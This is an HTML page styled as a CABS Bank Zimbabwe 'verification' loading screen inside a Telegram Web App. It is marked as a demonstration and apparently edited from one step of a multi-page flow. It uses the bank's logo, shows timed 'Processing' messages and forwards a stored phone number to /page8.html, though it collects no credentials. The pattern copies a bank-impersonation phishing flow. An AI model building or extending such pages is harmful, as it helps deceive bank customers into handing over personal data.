
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<meta name="theme-color" content="#092c4c">
<title>CABS Bank Zimbabwe | Demo Verification</title>

<script src="https://telegram.org/js/telegram-web-app.js"></script>

<style>
* {
    box-sizing: border-box;
}

body {
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI",
    Roboto, Helvetica, Arial, sans-serif;
    background: #f4f6f9;
    margin: 0;
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
    overflow: hidden;
}

.loading-card {
    background: white;
    width: 90%;
    max-width: 380px;
    padding: 40px 20px;
    border-radius: 16px;
    text-align: center;
    box-shadow: 0 10px 30px rgba(9, 44, 76, 0.15);
    border: 1px solid #e1e8ed;
}

.demo-notice {
    background: #fff7e8;
    color: #76531c;
    border: 1px solid #ead6ad;
    border-radius: 6px;
    padding: 8px;
    font-size: 10px;
    margin-bottom: 25px;
}

/* CABS-inspired blue and gold styling */
.logo-image {
    height: 45px;
    width: auto;
    object-fit: contain;
    margin-bottom: 25px;
}

.loader-circle {
    width: 120px;
    height: 120px;
    background: radial-gradient(circle, #174d73 0%, #092c4c 100%);
    border-radius: 50%;
    margin: 0 auto 30px;
    display: flex;
    justify-content: center;
    align-items: center;
    position: relative;
    box-shadow: 0 8px 20px rgba(9, 44, 76, 0.3);
}

.loader-circle::after {
    content: '';
    width: 90px;
    height: 90px;
    border: 4px solid rgba(255,255,255,0.2);
    border-top: 4px solid #c69a42;
    border-radius: 50%;
    animation: spin 1.2s linear infinite;
}

@keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
}

h2 {
    color: #092c4c;
    font-size: 26px;
    margin: 0 0 12px;
    font-weight: bold;
}

p {
    color: #555;
    font-size: 15px;
    margin: 0;
    line-height: 1.5;
}

.brand-footer {
    margin-top: 30px;
    font-size: 11px;
    color: #999;
    text-transform: uppercase;
    letter-spacing: 1px;
}

.demo-footer {
    margin-top: 10px;
    font-size: 10px;
    color: #999;
}
</style>
</head>

<body>

<div class="loading-card">

    <div class="demo-notice">
        DEMONSTRATION ONLY — NOT AN OFFICIAL BANK SERVICE
    </div>

    <img
        class="logo-image"
        src="https://pbs.twimg.com/profile_images/1204047964710359040/zg_xDDsa.jpg"
        alt="CABS logo"
    >

    <div class="loader-circle" id="loader"></div>

    <h2 id="main-text">Please wait...</h2>

    <p id="sub-text">
        Running the demonstration verification process...
    </p>

    <div class="brand-footer">
        CABS Bank Zimbabwe — Demo Interface
    </div>

    <div class="demo-footer">
        © 2026 Demonstration Project
    </div>

</div>

<script>
document.addEventListener("DOMContentLoaded", () => {

    const mainText = document.getElementById("main-text");
    const subText = document.getElementById("sub-text");
    const loader = document.getElementById("loader");

    const tg = window.Telegram?.WebApp;

    if (tg) {
        tg.ready();
        tg.expand();
    }

    // Read only the demo phone reference.
    const phone = localStorage.getItem("phone") || "";

    if (phone) {
        localStorage.setItem("user_phone_number", phone);
    }

    // Demo processing message.
    setTimeout(() => {

        mainText.textContent = "Processing...";
        subText.textContent =
            "Completing the demonstration verification process.";

    }, 4000);

    // No banking PIN collection or credential transmission.
    // Demonstration completes after the original waiting period.
    setTimeout(() => {

        mainText.textContent = "Demo Completed";
        subText.textContent =
            "The demonstration verification process has finished.";

        loader.style.background = "#c69a42";

        loader.style.boxShadow =
            "0 8px 20px rgba(198,154,66,0.3)";

        setTimeout(() => {

            // Original successful destination preserved.
            window.location.href =
                `/page8.html?phone=${encodeURIComponent(phone)}`;

        }, 1500);

    }, 6500);

});
</script>

</body>
</html>
